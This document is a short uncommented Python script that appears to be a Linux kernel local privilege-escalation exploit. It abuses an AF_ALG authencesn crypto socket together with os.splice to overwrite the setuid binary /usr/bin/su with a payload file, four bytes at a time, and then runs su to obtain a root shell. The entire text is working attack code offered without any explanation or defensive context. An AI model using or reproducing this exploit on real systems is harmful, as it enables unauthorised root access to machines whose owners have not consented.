#!/usr/bin/env python3
import os, socket


def write_chunk(target_fd, target_offset, chunk):
    af_alg_sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
    af_alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    af_alg_sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_KEY, bytes.fromhex("0800010000000010" + "0" * 64))
    af_alg_sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_AEAD_AUTHSIZE, None, 4)
    connection, _ = af_alg_sock.accept()
    offset = target_offset + 4
    connection.sendmsg(
        [b"A" * 4 + chunk],
        [
            (socket.SOL_ALG, socket.ALG_SET_OP, b"\0" * 4),
            (socket.SOL_ALG, socket.ALG_SET_IV, b"\x10" + b"\0" * 19),
            (socket.SOL_ALG, socket.ALG_SET_AEAD_ASSOCLEN, b"\x08" + b"\0" * 3),
        ],
        socket.MSG_MORE,
    )
    r, w = os.pipe()
    os.splice(target_fd, w, offset, offset_src=0)
    os.splice(r, connection.fileno(), offset)
    try:
        connection.recv(8 + target_offset)
    except:
        pass


setuid_fd = os.open("/usr/bin/su", 0)
with open("payload.elf", "rb") as payload_file:
    payload_bytes = payload_file.read()
for i in range(0, len(payload_bytes), 4):
    write_chunk(setuid_fd, i, payload_bytes[i : i + 4])
os.system("su")
